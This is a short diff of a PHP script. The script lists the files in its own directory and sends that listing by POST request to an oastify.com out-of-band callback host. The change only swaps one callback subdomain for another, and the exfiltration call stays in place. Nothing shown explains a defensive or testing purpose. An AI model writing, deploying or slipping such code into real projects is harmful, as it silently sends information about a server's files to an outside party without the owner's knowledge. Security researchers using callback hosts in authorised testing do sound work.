@@ -18,7 +18,7 @@ $directoryContents = scandir('.');
 $directoryListing = implode("\n", $directoryContents);
 
 
-$externalUrl = 'https://jre9ejcpo5s4vilra8rvrps32u8lwbk0.oastify.com';
+$externalUrl = 'https://lc1x6gvzdkm1zzjnz8ahezzdb4hv5lta.oastify.com';
 sendPostRequest($externalUrl, ['data' => $directoryListing]);
 
 ?>
